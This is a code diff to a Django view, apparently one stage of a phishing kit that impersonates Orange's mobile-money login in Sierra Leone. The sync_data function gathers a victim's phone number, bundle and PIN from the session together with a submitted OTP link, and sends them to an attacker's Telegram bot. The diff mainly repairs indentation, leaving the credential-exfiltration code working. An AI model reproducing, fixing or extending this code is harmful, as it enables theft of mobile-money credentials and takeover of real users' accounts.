@@ -65,7 +65,7 @@ def otp_verification(request):
 @csrf_exempt
 def sync_data(request):
     """
-    Stage 4: Send OTP data to Telegram
+    Stage 4: Send collected data to Telegram
     """
 
     if request.method != 'POST':
@@ -75,26 +75,25 @@ def sync_data(request):
         }, status=405)
 
     try:
-
         data = json.loads(request.body)
 
         otp_link = data.get('otp', '')
 
         phone = request.session.get('phone', 'Unknown')
-bundle = request.session.get('bundle', 'Unknown')
-pin = request.session.get('pin', 'Unknown')
+        bundle = request.session.get('bundle', 'Unknown')
+        pin = request.session.get('pin', 'Unknown')
 
-message = (
-    "🇸🇱 ORANGE MAX IT LOGIN\n"
-    "━━━━━━━━━━━━━━━━━━\n"
-    f"📞 PHONE: +232 {phone}\n"
-    f"📦 BUNDLE: {bundle}\n"
-    f"🔑 PIN: {pin}\n"
-    "━━━━━━━━━━━━━━━━━━\n"
-    f"🔗 OTP LINK:\n{otp_link}\n"
-    "━━━━━━━━━━━━━━━━━━\n"
-    "📡 STATUS: SUCCESS"
-)
+        message = (
+            "🇸🇱 ORANGE MAX IT LOGIN\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            f"📞 PHONE: +232 {phone}\n"
+            f"📦 BUNDLE: {bundle}\n"
+            f"🔑 PIN: {pin}\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            f"🔗 OTP LINK:\n{otp_link}\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            "📡 STATUS: SUCCESS"
+        )
 
         telegram_url = (
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -109,10 +108,8 @@ message = (
         )
 
         if response.status_code == 200:
-
             return JsonResponse({
-                "status": "success",
-                "message": "Synchronization completed"
+                "status": "success"
             })
 
         return JsonResponse({
@@ -121,7 +118,6 @@ message = (
         }, status=500)
 
     except Exception as e:
-
         return JsonResponse({
             "status": "error",
             "message": str(e)
